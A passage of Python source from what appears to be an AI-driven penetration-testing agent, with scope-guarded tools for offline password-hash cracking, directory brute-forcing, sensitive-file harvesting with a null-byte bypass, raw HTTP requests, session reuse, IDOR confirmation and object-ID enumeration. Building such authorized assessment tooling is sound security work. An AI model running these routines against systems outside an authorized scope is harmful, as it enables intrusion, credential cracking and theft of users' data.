        import hashid_tool as hid
        h = (inp.get("hash") or "").strip()
        if not h or " " in h or len(h) > 4096:
            return ToolResult("hash_crack", "", False, "No valid single hash supplied", [])
        cands = hid.identify(h)
        # resolve wordlist: catalog id -> temp file, or an absolute path
        wlspec = inp.get("wordlist") or "passwords-common"
        wl_path = None
        if os.path.isabs(wlspec) and os.path.isfile(wlspec):
            wl_path = wlspec
        else:
            words = wl.get_words(wlspec) or wl.get_words("passwords-common")
            with tempfile.NamedTemporaryFile("w", delete=False, suffix=".txt") as tf:
                tf.write("\n".join(words)); wl_path = tf.name
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".hash") as hf:
            hf.write(h); hash_file = hf.name
        cracked, engine = "", ""
        try:
            if shutil.which("hashcat") and cands and cands[0].get("hashcat") is not None:
                cmd = hid.hashcat_cmd(hash_file, wl_path, cands[0]["hashcat"])
                await self._cmd(cmd, timeout=120)
                out, _ = await self._cmd(cmd + ["--show"], timeout=30)
                if out and ":" in out:
                    cracked = out.strip().splitlines()[-1].split(":", 1)[-1]; engine = "hashcat"
            elif shutil.which("john"):
                fmt = cands[0].get("john") if cands else None
                await self._cmd(hid.john_cmd(hash_file, wl_path, fmt), timeout=120)
                out, _ = await self._cmd(["john", "--show"] + (["--format=" + fmt] if fmt else []) + [hash_file], timeout=30)
                if out and ":" in out:
                    cracked = out.strip().splitlines()[0].split(":", 1)[-1]; engine = "john"
            else:
                return ToolResult("hash_crack", "", True,
                                  "Skipped — neither hashcat nor john installed (optional; offline-only feature)", [])
        finally:
            for p in (wl_path, hash_file):
                try:
                    if p and not (os.path.isabs(wlspec) and p == wlspec):
                        os.unlink(p)
                except OSError:
                    pass
        if not cracked:
            return ToolResult("hash_crack", "", True, f"Not cracked with {wlspec} (offline dictionary)", [])
        finding = {"title": "Weak password hash cracked offline", "severity": "high", "family": "crypto",
                   "confidence": "confirmed", "target": "", "tags": ["hash", "offline-crack", engine],
                   "description": ("A password hash (obtained during the assessment) was reversed offline with a "
                                   "dictionary attack, proving weak/unsalted hashing and a guessable password."),
                   "evidence": f"{engine} recovered the plaintext for the supplied {cands[0]['name'] if cands else 'hash'} (redacted).",
                   "reproduction_steps": ["Load the extracted hash into hashcat/John offline",
                                          "Run a wordlist attack (no network / no live auth)",
                                          "Recover the plaintext"]}
        return ToolResult("hash_crack", "", True, f"hash cracked offline ({engine})", [finding])

    async def _bin_discovery(self, tool: str, cmd: list, url: str) -> ToolResult:
        """Shared driver for optional content-discovery binaries (ferox/dirsearch/gobuster).
        Scope-guarded, arg-array (no shell), graceful skip when the binary is absent."""
        if not self.scope.validate(url)[0]:
            return ToolResult(tool, url, False, "Off-scope", [])
        out, err = await self._cmd(cmd, timeout=300)
        if err.startswith("__MISSING__"):
            return ToolResult(tool, url, False, "", [], f"{cmd[0]} not installed (native content_discovery + ffuf remain available)")
        paths = sorted(set(re.findall(r"https?://[^\s\"']+", out or "")))[:400]
        in_scope = [p for p in paths if self.scope.validate(p)[0]]
        self._add_urls(in_scope)
        leads = []
        if in_scope:
            leads.append({"title": f"Content discovered via {cmd[0]} ({len(in_scope)} path(s))",
                          "severity": "info", "family": "recon", "confidence": "lead", "target": url,
                          "tags": ["content-discovery", cmd[0]],
                          "description": f"{cmd[0]} enumerated in-scope paths (verify each before reporting).",
                          "evidence": "\n".join(in_scope[:60])})
        return ToolResult(tool, url, True, f"{cmd[0]}: {len(in_scope)} in-scope path(s)", leads)

    async def _run_ferox(self, inp: dict) -> ToolResult:
        url = (inp.get("url") or "").strip()
        wl = inp.get("wordlist") or "/usr/share/seclists/Discovery/Web-Content/common.txt"
        return await self._bin_discovery("ferox", ["feroxbuster", "-u", url, "-w", wl,
                                                   "--silent", "--no-recursion", "-k"], url)

    async def _run_dirsearch(self, inp: dict) -> ToolResult:
        url = (inp.get("url") or "").strip()
        cmd = ["dirsearch", "-u", url, "-q", "--format=plain"]
        if inp.get("wordlist"):
            cmd += ["-w", inp["wordlist"]]
        return await self._bin_discovery("dirsearch", cmd, url)

    async def _run_gobuster(self, inp: dict) -> ToolResult:
        url = (inp.get("url") or "").strip()
        wl = inp.get("wordlist") or "/usr/share/seclists/Discovery/Web-Content/common.txt"
        return await self._bin_discovery("gobuster", ["gobuster", "dir", "-u", url, "-w", wl,
                                                      "-q", "--no-color", "-k"], url)

    async def _run_nosqlmap(self, inp: dict) -> ToolResult:
        """Optional NoSQLMap adapter; native run_nosqli remains the default engine."""
        url = (inp.get("url") or "").strip()
        if not self.scope.validate(url)[0]:
            return ToolResult("nosqlmap", url, False, "Off-scope", [])
        out, err = await self._cmd(["nosqlmap", "--url", url], timeout=300)
        if err.startswith("__MISSING__"):
            return ToolResult("nosqlmap", url, False, "", [], "nosqlmap not installed (native run_nosqli remains available)")
        hit = bool(re.search(r"injectable|vulnerable|payload", out or "", re.I))
        leads = []
        if hit:
            leads.append({"title": "NoSQL injection signal (NoSQLMap)", "severity": "medium",
                          "family": "nosqli", "confidence": "lead", "target": url, "tags": ["nosqli", "nosqlmap"],
                          "description": "NoSQLMap reported a NoSQL-injection signal (verify with native run_nosqli).",
                          "evidence": (out or "")[:800]})
        return ToolResult("nosqlmap", url, True, "nosqlmap completed", leads)

    async def _run_dir_harvest(self, inp: dict) -> ToolResult:
        """INTRUSIVE: find browsable file directories (ftp/uploads/backup/…) and harvest
        sensitive files; on a blocked backup file, try a poison-null-byte extension bypass.
        Scope-guarded, bounded, confirmed only when content is genuinely sensitive."""
        import httpx
        import exposure_tool as exp
        base = inp.get("base_url") or inp.get("url") or ""
        m = re.match(r"(https?://[^/]+)", base)
        if not m:
            return ToolResult("dir_harvest", base, False, "No base URL", [])
        origin = m.group(1)
        if not self.scope.validate(origin)[0]:
            return ToolResult("dir_harvest", origin, False, "Off-scope", [])
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        findings, harvested = [], 0
        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers, timeout=20) as c:
            async def get(u):
                if not self.scope.validate(u)[0]:
                    return None
                try:
                    return await c.get(u)
                except Exception:
                    return None
            for d in exp.DIR_CANDIDATES[:20]:
                if harvested >= 60:
                    break
                r = await get(origin + "/" + d)
                if r is None or r.status_code != 200 or not exp.looks_like_listing(r.text):
                    continue
                for fp in exp.parse_listing(r.text):
                    if harvested >= 60:
                        break
                    if not exp.is_harvestable(fp):
                        continue
                    furl = origin + "/" + fp.lstrip("/")
                    fr = await get(furl)
                    if fr is None:
                        continue
                    if fr.status_code == 200 and exp._SENSITIVE_SIG.search(fr.text or ""):
                        harvested += 1
                        findings.append(self._attach_poc(exp.harvest_finding(furl, fp, False, fr.text), furl, fr))
                    elif fr.status_code in (401, 403):
                        for nb in exp.nullbyte_variants(fp):
                            nbr = await get(origin + "/" + nb.lstrip("/"))
                            if nbr is not None and nbr.status_code == 200 and (nbr.text or "").strip():
                                harvested += 1
                                findings.append(self._attach_poc(
                                    exp.harvest_finding(origin + "/" + nb.lstrip("/"), fp, True, nbr.text),
                                    origin + "/" + nb.lstrip("/"), nbr))
                                break
        if harvested:
            self.state.add_capability(self._Capability.ARBITRARY_FILE_READ, f"harvested {harvested} exposed file(s)")
        return ToolResult("dir_harvest", origin, True, f"harvested {harvested} sensitive file(s)", findings)

    # ── LLM investigative action primitives (2026-07) ────────────
    # These hand the ReAct loop the ATOMS of manual testing — craft/modify/send a scoped
    # request, and diff two responses — so the model can run discover→hypothesize→test→
    # compare→adapt→confirm instead of only firing canned scanners. Every call is
    # scope-guarded here (defence in depth on top of the wrapper), the response is
    # size-capped and secret-redacted before the model sees it, and permission classes
    # do the rest: http_read is ACTIVE (safe methods, ungated); http_request is INTRUSIVE
    # (any method/body, rides the HITL gate). The model still cannot store a finding
    # without evidence — confirmation is a deterministic diff, never the model's opinion.
    _SAFE_METHODS = ("GET", "HEAD", "OPTIONS")
    _RESP_CAP = 4000

    def _shape_response(self, r, elapsed: float) -> dict:
        """Model-visible response view: status, safe headers, capped+redacted body."""
        import poc as _poc
        hdrs = {}
        for k, v in (r.headers.items() if r is not None else []):
            if k.lower() in ("set-cookie", "authorization", "proxy-authorization"):
                hdrs[k] = "<redacted>"
            else:
                hdrs[k] = v[:300]
        body = (r.text if r is not None else "")[: self._RESP_CAP]
        try:
            body = _poc.redact(body) if hasattr(_poc, "redact") else body
        except Exception:
            pass
        return {"status": r.status_code if r is not None else 0,
                "length": len(r.text) if r is not None else 0,
                "elapsed_ms": int(elapsed * 1000),
                "headers": hdrs, "body": body,
                "truncated": bool(r is not None and len(r.text) > self._RESP_CAP)}

    async def _http_send(self, method: str, url: str, headers: dict, body, follow: bool):
        import time
        import httpx
        if not self.budget.charge():
            raise RuntimeError("mission request budget exhausted (%d requests)" % self.budget.limit)
        h = {"User-Agent": _UA, **(self.session_headers or {}), **(headers or {})}
        t0 = time.perf_counter()
        async with httpx.AsyncClient(verify=False, follow_redirects=follow, headers=h, timeout=20) as c:
            content = None
            if body is not None:
                content = body if isinstance(body, (bytes, str)) else json.dumps(body)
            r = await c.request(method, url, content=content if isinstance(content, (bytes, str)) else None)
            self._harvest_response(url, r)
            try:
                self.capture.add(method, url, r.status_code, req_headers=h, resp_headers=dict(r.headers),
                                 resp_len=len(r.content), ms=(time.perf_counter() - t0) * 1000, engine="http",
                                 resp_ct=r.headers.get("content-type", ""))
            except Exception:
                pass
            return r, time.perf_counter() - t0

    def _harvest_body(self, source: str, headers, body) -> None:
        """Route a fetched body into the target-intel store by content-type. Shared by the
        investigative transport (_http_send) AND the deterministic fetch helper (_http), so a
        plain deterministic scan fills the intel store too. Best-effort; never raises."""
        try:
            try:
                ct = (headers.get("content-type") or "").lower()
            except Exception:
                ct = ""
            body = (body or "")[:200000]
            u = (source or "").split("?")[0]
            material = {"source": source, "headers": headers}
            if "json" in ct:
                material["json"] = body
            elif "javascript" in ct or "ecmascript" in ct or u.endswith(".js"):
                material["js"] = body
            elif "text/css" in ct or u.endswith(".css"):
                material["css"] = body
            elif "html" in ct or u.endswith((".html", ".htm")) or (not ct and "<" in body[:200]):
                material["html"] = body          # structured HTML mining: forms/params, links, comments, redirects
            else:
                material["text"] = body
            self._intel_mod.harvest(material, self.intel)
        except Exception:
            pass

    def _harvest_response(self, url: str, r) -> None:
        """Harvest an httpx Response (investigative-transport path)."""
        try:
            self._harvest_body(url, r.headers, r.text)
        except Exception:
            pass
        # cloud fingerprint: identify AWS/Azure/GCP/Cloudflare from this response + record cloud assets
        # into the LIVE graph, so cloud is a real recon signal (not a report decoration).
        try:
            import cloud_intel as _ci
            from urllib.parse import urlparse as _up
            verdict = _ci.analyze(url=url, headers=dict(r.headers))
            if verdict.get("is_cloud"):
                _ci.to_graph_facts(self.graph, _up(url).netloc, verdict)
        except Exception:
            pass

    def _resolve_headers(self, inp: dict) -> dict:
        """Merge explicit headers with a named acquired session (inp['session'] → role).
        The session's real token is injected here and NEVER returned to the model."""
        h = dict(inp.get("headers") or {})
        role = inp.get("session")
        if role and role in self._sessions:
            h = {**self._sessions[role], **h}
        return h

    async def _acquire_session(self, inp: dict) -> ToolResult:
        """ACTIVE: authenticate ONCE with a supplied credential and store the session under a
        role name for reuse (pass session=<role> to the investigative primitives). This is
        authorized authentication with a single credential pair the agent already holds — NOT
        credential brute-force: it is hard-capped per mission and never iterates a password
        list. The token is stored server-side and is never exposed to the model."""
        import httpx
        url = (inp.get("login_url") or inp.get("url") or "").strip()
        user = inp.get("username") or inp.get("email") or ""
        pw = inp.get("password") or ""
        role = inp.get("role") or "default"
        self._login_attempts += 1
        if self._login_attempts > 8:
            return ToolResult("acquire_session", url, False, "", [],
                              "login attempt cap reached (anti-brute-force): acquire_session does not iterate credentials")
        if not url or not self.scope.validate(url)[0]:
            return ToolResult("acquire_session", url, False, "", [], "SCOPE BLOCK: off-scope login URL")
        auth_header, identity = None, None
        # 1) JSON API login (SPA / REST)
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15,
                                         headers={"User-Agent": _UA}) as c:
                for body in ({"email": user, "password": pw}, {"username": user, "password": pw}):
                    try:
                        r = await c.post(url, json=body)
                    except Exception:
                        continue
                    if r.status_code in (200, 201):
                        try:
                            j = r.json()
                        except Exception:
                            j = {}
                        tok = ((j.get("authentication") or {}).get("token") or j.get("token")
                               or j.get("access_token") or j.get("jwt") or j.get("id_token"))
                        if tok:
                            auth_header = {"Authorization": "Bearer " + tok}
                            identity = (j.get("authentication") or {}).get("umail") or user
                            break
                        ck = "; ".join(f"{k}={v}" for k, v in c.cookies.items())
                        if ck:
                            auth_header = {"Cookie": ck}; identity = user; break
        except Exception:
            pass
        # 2) fallback: form login
        if not auth_header:
            import auth
            res = await auth.login(url, user, pw)
            if res.get("headers"):
                auth_header, identity = res["headers"], user
        if not auth_header:
            return ToolResult("acquire_session", url, True,
                              json.dumps({"acquired": False, "role": role, "note": "login did not yield a session"}), [])
        self._sessions[role] = auth_header
        kind = "bearer" if "Authorization" in auth_header else "cookie"
        self.state.add_identity(role, {"auth_type": kind, "identity": identity,
                                       "is_admin": bool(identity and "admin" in str(identity).lower())})
        return ToolResult("acquire_session", url, True,
                          json.dumps({"acquired": True, "role": role, "auth_type": kind, "identity": identity,
                                      "usage": f'pass session="{role}" to http_read / http_diff / confirm_idor / enumerate_ids'}),
                          [])

    async def _http_read(self, inp: dict) -> ToolResult:
        """ACTIVE: send a scope-guarded SAFE-method request (GET/HEAD/OPTIONS) with custom
        headers (e.g. an Authorization token) and return the response to the model. The
        read atom of investigation — IDOR/BOLA reads, JWT-accept checks, enumeration."""
        method = (inp.get("method") or "GET").upper()
        url = (inp.get("url") or "").strip()
        if method not in self._SAFE_METHODS:
            return ToolResult("http_read", url, False, "", [],
                              f"http_read is read-only ({'/'.join(self._SAFE_METHODS)}); use http_request for {method}")
        if not self.scope.validate(url)[0]:
            return ToolResult("http_read", url, False, "", [], "SCOPE BLOCK: off-scope URL")
        try:
            r, el = await self._http_send(method, url, self._resolve_headers(inp), None, bool(inp.get("follow", True)))
        except Exception as e:
            return ToolResult("http_read", url, False, "", [], f"request failed: {e}")
        view = self._shape_response(r, el)
        return ToolResult("http_read", url, True,
                          json.dumps({"method": method, "url": url, **view}), [])

    async def _http_request(self, inp: dict) -> ToolResult:
        """INTRUSIVE: send a scope-guarded request with ANY method + body (state-changing).
        Rides the HITL gate (INTRUSIVE). The write atom of investigation — object
        manipulation, forged-token POSTs, business-rule violations. Confirmation is still
        a deterministic diff, not this call's say-so."""
        method = (inp.get("method") or "POST").upper()
        url = (inp.get("url") or "").strip()
        if not self.scope.validate(url)[0]:
            return ToolResult("http_request", url, False, "", [], "SCOPE BLOCK: off-scope URL")
        try:
            r, el = await self._http_send(method, url, self._resolve_headers(inp),
                                          inp.get("body"), bool(inp.get("follow", True)))
        except Exception as e:
            return ToolResult("http_request", url, False, "", [], f"request failed: {e}")
        view = self._shape_response(r, el)
        return ToolResult("http_request", url, True,
                          json.dumps({"method": method, "url": url, **view}), [])

    async def _http_diff(self, inp: dict) -> ToolResult:
        """ACTIVE: send two SAFE-method requests and return a DETERMINISTIC differential —
        the confirmation-oracle substrate. status match, length delta, and body similarity
        let the model (and truth-first checks) decide vulnerable vs safe vs inconclusive
        without guessing. E.g. IDOR: request self-object vs other-object and compare."""
        import difflib
        a, b = inp.get("a") or {}, inp.get("b") or {}
        for spec in (a, b):
            if (spec.get("method") or "GET").upper() not in self._SAFE_METHODS:
                return ToolResult("http_diff", "", False, "", [], "http_diff is read-only; use http_request for writes")
            if not self.scope.validate((spec.get("url") or "").strip())[0]:
                return ToolResult("http_diff", spec.get("url", ""), False, "", [], "SCOPE BLOCK: off-scope URL")
        try:
            ra, _ = await self._http_send("GET", a["url"], self._resolve_headers(a), None, True)
            rb, _ = await self._http_send("GET", b["url"], self._resolve_headers(b), None, True)
        except Exception as e:
            return ToolResult("http_diff", "", False, "", [], f"request failed: {e}")
        sim = difflib.SequenceMatcher(None, ra.text[:8000], rb.text[:8000]).ratio()
        out = {"a": {"url": a["url"], "status": ra.status_code, "length": len(ra.text)},
               "b": {"url": b["url"], "status": rb.status_code, "length": len(rb.text)},
               "same_status": ra.status_code == rb.status_code,
               "length_delta": abs(len(ra.text) - len(rb.text)),
               "body_similarity": round(sim, 3),
               # interpretation aid (still deterministic): two 200s with distinct bodies
               # on an object endpoint is the IDOR signature; the model confirms with context.
               "distinct_objects": ra.status_code == 200 and rb.status_code == 200 and sim < 0.98}
        return ToolResult("http_diff", a.get("url", ""), True, json.dumps(out), [])

    def _role_headers(self, inp: dict, prefix: str) -> dict:
        """Resolve headers for a named role: {prefix}_session (from acquire_session) merged
        with {prefix}_headers. Used to test an object across TWO identities."""
        h = dict(inp.get(prefix + "_headers") or {})
        role = inp.get(prefix + "_session")
        if role and role in self._sessions:
            h = {**self._sessions[role], **h}
        return h

    async def _confirm_idor(self, inp: dict) -> ToolResult:
        """ACTIVE oracle-helper for IDOR/BOLA. Ownership is only proven with TWO identities:
        the OWNER (who legitimately holds the object) and the ATTACKER (a different identity).
        A CONFIRMED finding is produced only when the attacker reads the SAME object the owner
        sees (high response similarity, both 200) — that is genuine cross-user access. With
        only ONE identity the tool cannot prove ownership, so it emits a LEAD, never a
        confirmed finding (this is the fix for over-confirming on two distinct 200s)."""
        import difflib
        target = (inp.get("target_url") or "").strip()
        if not target:
            return ToolResult("confirm_idor", "", False, "", [], "target_url required")
        if not self.scope.validate(target)[0]:
            return ToolResult("confirm_idor", target, False, "", [], "SCOPE BLOCK: off-scope URL")
        owner_h = self._role_headers(inp, "owner")
        attacker_h = self._role_headers(inp, "attacker")

        # ── strong path: two distinct identities ──
        if owner_h and attacker_h:
            try:
                ro, _ = await self._http_send("GET", target, owner_h, None, True)
                ra, _ = await self._http_send("GET", target, attacker_h, None, True)
            except Exception as e:
                return ToolResult("confirm_idor", target, False, "", [], f"request failed: {e}")
            sim = difflib.SequenceMatcher(None, ro.text[:8000], ra.text[:8000]).ratio()
            confirmed = (ro.status_code == 200 and ra.status_code == 200 and len(ra.text) > 2 and sim >= 0.9)
            detail = {"mode": "two-identity", "confirmed": confirmed, "owner_status": ro.status_code,
                      "attacker_status": ra.status_code, "owner_attacker_similarity": round(sim, 3)}
            if not confirmed:
                return ToolResult("confirm_idor", target, True, json.dumps(detail), [])
            f = {"title": "IDOR / BOLA — cross-user object access confirmed", "severity": "high",
                 "target": target, "family": "idor", "cwe": "CWE-639", "confidence": "confirmed",
                 "tags": ["idor", "bola", "access-control"],
                 "description": ("An object owned by one user was read by a DIFFERENT authenticated user. The object "
                                 "identifier is not authorization-checked, so any user can read another user's records."),
                 "impact": "Read other users' data (PII, orders, baskets); bulk exfiltration by walking the id space.",
                 "reproduction_steps": [f"As the owner, GET {target} → 200 (owner's object)",
                                        f"As a DIFFERENT user, GET {target} → 200 with the SAME object "
                                        f"(response similarity {round(sim, 3)}) — cross-user read"],
                 "evidence": (f"owner GET {target} -> {ro.status_code} ({len(ro.text)}b)\n"
                              f"attacker (different identity) GET {target} -> {ra.status_code} ({len(ra.text)}b); "
                              f"owner/attacker similarity {round(sim, 3)} (>=0.9 = same object)")}
            self.state.add_capability(self._Capability.FOREIGN_OBJECT_READ, f"cross-user read of {target}")
            self.state.add_object(target, owner_role="owner", status=200)
            return ToolResult("confirm_idor", target, True, json.dumps(detail), [f])

        # ── weak path: one identity → LEAD only (cannot prove ownership) ──
        owned = (inp.get("owned_url") or "").strip()
        headers = self._resolve_headers(inp) or owner_h or attacker_h
        if not owned:
            return ToolResult("confirm_idor", target, True,
                              json.dumps({"mode": "single-identity", "confirmed": False,
                                          "note": "provide owner_session + attacker_session to CONFIRM cross-user "
                                                  "access; with owned_url only, a single-identity heuristic emits a lead"}),
                              [])
        control = re.sub(r"/(\d+)(\D*)$", lambda m: "/99999999" + (m.group(2) or ""), target)
        try:
            ro, _ = await self._http_send("GET", owned, headers, None, True)
            rt, _ = await self._http_send("GET", target, headers, None, True)
            rc, _ = (await self._http_send("GET", control, headers, None, True)) if control != target else (rt, 0)
        except Exception as e:
            return ToolResult("confirm_idor", target, False, "", [], f"request failed: {e}")
        sim_ot = difflib.SequenceMatcher(None, ro.text[:8000], rt.text[:8000]).ratio()
        sim_tc = difflib.SequenceMatcher(None, rt.text[:8000], rc.text[:8000]).ratio()
        signal = (rt.status_code == 200 and ro.status_code == 200 and len(rt.text) > 2
                  and sim_ot < 0.98 and (rc.status_code >= 400 or sim_tc < 0.95))
        detail = {"mode": "single-identity", "confirmed": False, "idor_signal": signal,
                  "owned_status": ro.status_code, "target_status": rt.status_code,
                  "owned_target_similarity": round(sim_ot, 3)}
        leads = []
        if signal:
            leads.append({"title": "Possible IDOR/BOLA — object id not access-checked (single-identity signal)",
                          "severity": "medium", "target": target, "family": "idor", "confidence": "lead",
                          "cwe": "CWE-639", "tags": ["idor", "bola", "access-control"],
                          "description": ("One session read two distinct objects by changing the id. This is an IDOR "
                                          "SIGNAL, not proof of ownership — CONFIRM by reading the target as a DIFFERENT "
                                          "user (owner_session + attacker_session)."),
                          "evidence": f"owned {owned} -> {ro.status_code}; target {target} -> {rt.status_code}; "
                                      f"similarity {round(sim_ot, 3)}; control {control} -> "
                                      f"{rc.status_code if control != target else 'n/a'}"})
        return ToolResult("confirm_idor", target, True, json.dumps(detail), leads)

    async def _run_enumerate_ids(self, inp: dict) -> ToolResult:
        """INTRUSIVE: bounded object-id enumeration on a templated URL — the IDOR-at-scale
        primitive. DECLARATIVE recipe only (no code from the model): a url containing {id}, a
        numeric range (hard-capped), optional session headers. Returns the ids whose response
        is a distinct populated 200 (vs a nonexistent-id baseline). Emits a LEAD, not a
        confirmed finding — use confirm_idor to prove ownership. Scope-guarded per request."""
        import difflib
        tmpl = (inp.get("url_template") or inp.get("url") or "").strip()
        headers = self._resolve_headers(inp)
        if "{id}" not in tmpl:
            return ToolResult("enumerate_ids", tmpl, False, "", [], "url_template must contain {id}")
        if not self.scope.validate(tmpl.replace("{id}", "1"))[0]:
            return ToolResult("enumerate_ids", tmpl, False, "", [], "SCOPE BLOCK: off-scope URL")
        lo = max(0, int(inp.get("start", 1)))
        hi = min(int(inp.get("end", lo + 20)), lo + 50)   # hard request cap
        try:
            rbase, _ = await self._http_send("GET", tmpl.replace("{id}", "99999999"), headers, None, True)
        except Exception:
            rbase = None
        accessible = []
        for i in range(lo, hi + 1):
            u = tmpl.replace("{id}", str(i))
            if not self.scope.validate(u)[0]:
                continue
            try:
                r, _ = await self._http_send("GET", u, headers, None, True)
            except Exception:
                continue
            if r.status_code == 200 and len(r.text) > 2:
                distinct = (rbase is None or r.status_code != rbase.status_code
                            or difflib.SequenceMatcher(None, r.text[:4000], (rbase.text[:4000] if rbase else "")).ratio() < 0.95)
                if distinct:
                    accessible.append(i)
        out = {"template": tmpl, "range": [lo, hi], "accessible_ids": accessible[:100], "count": len(accessible)}
        leads = []
        if len(accessible) >= 2:
            leads.append({"title": f"Enumerable objects by id ({len(accessible)} in {lo}..{hi})", "severity": "medium",
                          "target": tmpl, "family": "idor", "confidence": "lead",
                          "tags": ["idor", "enumeration", "bola"],
                          "description": ("Sequential object ids return distinct populated records. If these belong to "
                                          "other users this is a bulk IDOR — confirm ownership with confirm_idor."),
                          "evidence": f"accessible ids: {accessible[:30]}"})
        return ToolResult("enumerate_ids", tmpl, True, json.dumps(out), leads)

    async def _enumerate_ids(self, inp: dict) -> ToolResult:
        """Top-level dispatch alias. The CLAUDE_TOOLS spec is named `enumerate_ids`, so execute()'s
        getattr(self, "_" + name) resolves here; inside logic playbooks the same verb is mapped
        explicitly (workflow.py) to _run_enumerate_ids. Without this the model could call the
        advertised enumerate_ids tool top-level and get 'Unknown tool' — a broken IDOR-at-scale path."""
        return await self._run_enumerate_ids(inp)

    async def _run_authz_matrix(self, inp: dict) -> ToolResult:
        """ACTIVE: the two-user AUTHORIZATION MATRIX. Replays each discovered operation as every
        persona (anonymous, user_a, user_b, [privileged]) through the scoped + captured transport,
        then reads the DIFFERENCES deterministically:
          - missing_authentication : anon got the same protected data an authed role did
          - bfla (vertical)        : a normal user reached a privileged-looking function
          - bola_idor (horizontal) : user_b read the SAME protected object user_a holds while the
            ANONYMOUS control is denied — the anon-denied control proves the object is owned/
            protected, so two different users reading identical bytes is confirmed cross-user access.
        A genuinely PUBLIC endpoint (anon + A + B all see it) yields NO finding. Read-only (GET);
        write/vertical state-change proofs are separate bounded oracles. Roles are referenced by
        NAME — the raw session token is resolved server-side from the session store, never passed in
        or shown to the model."""
        import difflib
        import authz as _authz
        import authz_matrix as _am
        base = (inp.get("base_url") or "").strip()
        roles = inp.get("roles") or []            # [{role, rank, tenant}] — NO secrets here
        operations = inp.get("operations") or []  # [{request, path}]
        pair = inp.get("pair")                    # (owner_role, attacker_role) for horizontal read
        if not roles or not operations:
            return ToolResult("authz_matrix", base, True,
                              json.dumps({"ran": False, "note": "need >=1 role and >=1 operation"}), [])
        anon_role = next((r["role"] for r in roles if r.get("rank", 1) == 0), None)

        def _headers_for(role, rank):
            return {} if rank == 0 else dict(self._sessions.get(role, {}))

        # REAL transport counters (CHAD re-audit #2): PROVE authenticated requests actually happened
        # per persona, instead of inferring matrix_ops*personas. attempted = a request that carried
        # this role's real session; succeeded = the server accepted + served it (2xx/3xx). status_dist
        # + endpoints_touched are durable evidence the requests hit the wire and passed the auth layer.
        tc = {"attempted": 0, "succeeded": 0, "with_auth_material": 0, "by_role": {},
              "status_dist": {}, "_endpoints": set()}

        async def _fetch(path, role, rank):
            url = path if path.startswith("http") else base.rstrip("/") + "/" + path.lstrip("/")
            if not self.scope.validate(url)[0]:
                return 0, ""
            authed = rank > 0
            hdrs = _headers_for(role, rank)
            # CHAD re-audit #10: a bare 2xx can be a public/validation page. Only count a request as a
            # real authenticated SUCCESS when this persona's session material (Bearer/Cookie) was
            # actually ATTACHED to the request AND the server accepted+served it (2xx/3xx).
            auth_material = bool(hdrs.get("Authorization") or hdrs.get("Cookie"))
            if authed:
                tc["attempted"] += 1
                br = tc["by_role"].setdefault(role, {"attempted": 0, "succeeded": 0, "with_auth_material": 0})
                br["attempted"] += 1
                if auth_material:
                    tc["with_auth_material"] += 1
                    br["with_auth_material"] += 1
            try:
                r, _ = await self._http_send("GET", url, hdrs, None, True)
                st = r.status_code
                tc["status_dist"][str(st)] = tc["status_dist"].get(str(st), 0) + 1
                tc["_endpoints"].add(path)
                if authed and auth_material and 200 <= (st or 0) < 400:
                    tc["succeeded"] += 1
                    tc["by_role"][role]["succeeded"] += 1
                return st, r.text[:8000]
            except Exception:
                return 0, ""

        cells, resp = [], {}
        for op in operations[:40]:
            req = op.get("request") or op.get("path") or ""
            path = op.get("path") or req
            for r in roles:
                status, body = await _fetch(path, r["role"], r.get("rank", 1))
                resp[(req, r["role"])] = (status, body)
                cells.append({"request": req, "role": r["role"], "rank": r.get("rank", 1),
                              "status": status, "body": body, "tenant": r.get("tenant")})
        result = _authz.build_matrix(cells)
        findings = _am.gaps_to_findings(result, base_url=base)   # missing_auth + bfla (+ cross_tenant)

        # ── horizontal IDOR: ownership-proven similarity oracle ──
        if pair and anon_role:
            owner, attacker = pair[0], pair[1]
            for op in operations[:40]:
                req = op.get("request") or op.get("path") or ""
                if not _am.is_object_path(req):
                    continue
                so, bo = resp.get((req, owner), (0, ""))
                sa, ba = resp.get((req, attacker), (0, ""))
                sn, bn = resp.get((req, anon_role), (0, ""))
                if _authz._accessed(so, bo) and _authz._accessed(sa, ba) and not _authz._accessed(sn, bn):
                    sim = difflib.SequenceMatcher(None, bo, ba).ratio()
                    if sim >= 0.9:
                        target = req if req.startswith("http") else base.rstrip("/") + req
                        # OWNERSHIP PROOF (truth-first): two authed users seeing the same protected
                        # object is only IDOR if the object is OWNED by one of them — otherwise it may
                        # be a legitimately SHARED resource. We 'confirm' only with positive ownership
                        # evidence: the object body carries the OWNER's identity (email local-part /
                        # username) that a shared object would not. Otherwise it is a LEAD, not a finding.
                        marker = str(inp.get("owner_identity") or "").strip().lower().split("@")[0]
                        owned = len(marker) >= 3 and marker in bo.lower()
                        # own-object DIFFERENTIAL control (proves object-specific, not a shared/global
                        # blob): if the ATTACKER session gets DIFFERENT data at a DIFFERENT id of this
                        # endpoint, the endpoint returns per-object data — so two users reading the SAME
                        # id identically is genuine cross-user access. Confirms real IDORs (e.g. a basket)
                        # that don't embed the owner's identity, WITHOUT confirming a shared resource.
                        object_specific, ctrl_note = False, ""
                        if not owned:
                            try:
                                ctrl_req = re.sub(r"/(\d+)(?=/|$|\?)",
                                                  lambda m: "/" + str(int(m.group(1)) + 1), req, count=1)
                                if ctrl_req != req:
                                    ctrl_url = ctrl_req if ctrl_req.startswith("http") else base.rstrip("/") + ctrl_req
                                    if self.scope.validate(ctrl_url)[0]:
                                        rc, _ = await self._http_send("GET", ctrl_url,
                                                                      dict(self._sessions.get(attacker, {})), None, True)
                                        cb = (rc.text or "")[:8000]
                                        if _authz._accessed(rc.status_code, cb):
                                            csim = difflib.SequenceMatcher(None, ba, cb).ratio()
                                            object_specific = csim < 0.9
                                            ctrl_note = ("attacker also read %s -> 200 with DIFFERENT data "
                                                         "(similarity %.3f) — endpoint is object-specific" % (ctrl_req, csim))
                            except Exception:
                                pass
                        if owned:
                            # CONFIRMED only with positive ownership evidence: the object carries the
                            # owner's identity, which a shared resource would not.
                            findings.append({
                                "title": "IDOR / BOLA — cross-user object access confirmed",
                                "severity": "high", "family": "idor", "confidence": "confirmed",
                                "cwe": "CWE-639", "target": target,
                                "tags": ["idor", "bola", "access-control", "horizontal"],
                                "description": ("A protected, user-owned object was read by a DIFFERENT authenticated "
                                                "user. Anonymous was denied (protected); the object carries owner '%s' "
                                                "identity, and '%s' read the SAME object." % (owner, attacker)),
